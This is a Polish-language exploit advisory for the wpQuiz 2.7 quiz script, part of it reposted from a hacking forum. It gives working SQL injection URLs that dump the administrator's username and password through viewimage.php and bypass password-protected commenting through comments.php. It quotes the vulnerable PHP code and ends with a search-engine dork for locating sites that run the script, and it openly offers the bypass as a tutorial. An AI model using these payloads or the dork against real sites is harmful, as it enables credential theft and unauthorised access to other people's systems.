wpQuiz 2.7 Multiple Remote SQL Injection Vulnerabilities
========================================================




Tytul: wpQuiz 2.7 Remote SQL Injection Vulnerability
### http://wireplastik.com/projects.php


Autor: Kacper


Blad:


viewimage.php?id=-1&#039;+union+select+0,1,2,3,4,5,6,7,8,9,10,11,12,concat(user,char(58),password),14,15+from+users+where+id=1/*

Pozniej sciagnij obrazek i sprawdz jego zrodlo!


==========================================================================================================================
Kolejny blad dotyczy nieautoryzowanego dostepu do komentowania wynikow na quizie.








Skopiowane prosto z => http://devilteam.eu/forum/topics92/bypass-za-pomoca-sql-wpquiz-vt4278.htm
==========================================================================================================================
Elo, ostatnio natknolem sie na ciekawy skrypt Quizowy (WpQuiz) i znalazlem w nim pare ciekawych bledow. 

w skrypcie istnieje opcja pozwalajaca na blokowanie na haslo przez administratora komentowania wynikow w quizie. 

Plik comments.php zawiera zrodlo: 
Kod:
$no = $_GET[&#039;id&#039;]; 
$setcheck = mysql_fetch_array(mysql_query("SELECT * FROM sets WHERE id=&#039;".$no."&#039;")); 
if( mysql_affected_rows() == 0 ){ 
geterror("commentsinvalidset"); 
} 
if( $setcheck[&#039;isopen&#039;] == 0 ){ 
geterror("commentsquestionsetclosed"); 
} 
if($setcheck[&#039;password&#039;] != ""){ 
if( !isset($_POST[&#039;password&#039;]) || ($_POST[&#039;password&#039;] != $setcheck[&#039;password&#039;]) ){ 
?> 
<form name="pwCheck" action="<?= $_SERVER[&#039;PHP_SELF&#039;] ?>?id=<?=$no?>" method="post"> 
<div class="pagehead"><span class="big"><b><?=getlang("commentspasswordheader",1)?></b></span></div> 
<b><?=getlang("commentspasswordrequest",1)?></b><br /> 
<?=getlang("commentspassword",1)?> <input type="password" name="password" /> 
<input type="submit" value="<?=getlang("commentspasswordsubmit",1)?>" /> 
</form> 
<?php 
exit; 
} 
}



jak widac: 
Kod:
if($setcheck[&#039;password&#039;] != ""){



skrypt pobiera informacje z bazy danych na temat blokowania komentowania. Jesli ta opcja bedzie pusta czyli (null=0) to skrypt nie zawola o haslo. 

wiec wykonujemy zapytanie SQL dzieki linijce: 
Kod:
$no = $_GET[&#039;id&#039;]; 
$setcheck = mysql_fetch_array(mysql_query("SELECT * FROM sets WHERE id=&#039;".$no."&#039;"));



Nasze zapytanie: 
Kod:
comments.php?id=-9&#039;+union+select+0,1,2,3,4,5,null,7,8,9,10,11,12,13/*



metoda prob i bledow doszedlem do tego ?e kolumna numer 6 odpowiada za haslo i dalem tam null&#039;a  

taki maly tutek mo?e sie przydac dla tych co chca cos omijac zablokowanego na haslo  
==========================================================================================================================

//dork:"Powered by wpQuiz" 

Pozdrawiam



